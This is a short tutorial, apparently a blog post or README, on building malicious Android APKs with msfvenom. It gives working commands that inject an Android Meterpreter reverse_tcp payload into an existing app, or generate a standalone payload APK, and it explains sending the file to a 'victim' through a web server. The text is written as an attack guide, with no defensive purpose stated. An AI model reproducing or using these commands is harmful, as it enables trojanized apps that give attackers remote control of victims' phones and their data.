You can inject the Android Meterpreter into an existing APK or you can create default milicious apk of metasploit using msfvenom.
Here, You will know two methods: method 1 to create an injected apk from existing apk  which may make it easier to convince your victim to install the APK. And method 2 to create default metasploit milicious apk

## Method 1: 

Requirenments: (i) Apktool (latest)  (ii) Zipalign (installation help given here)

to create milicious apk from existing type command:
```
msfvenom -x  your_existing.apk -p android/meterpreter/reverse_tcp  LHOST=your_ip    LPORT=your_listning_port    -o   your_milicious_apkname.apk

```
this will generate your milicious apk which will look like your existing apk but its milicious.
you can send this apk to victim using apache web server or nginx and port forwarding.


To know how to create listning using msfconsole click here.

## Method 2: 
 
Requirenments: updated metasploit framework

To create default milicious apk of msfvenom type command:
```
msfvenom  -p android/meterpreter/reverse_tcp  LHOST=your_ip    LPORT=your_listning_port    -o   your_milicious_apkname.apk

```

This will generate your milicious apk. Its size will be (9 to 12 kb) approx.
And again you can send this apk to victim using apache web server or nginx and port forwarding.


Again To know how to create listning using msfconsole click here.
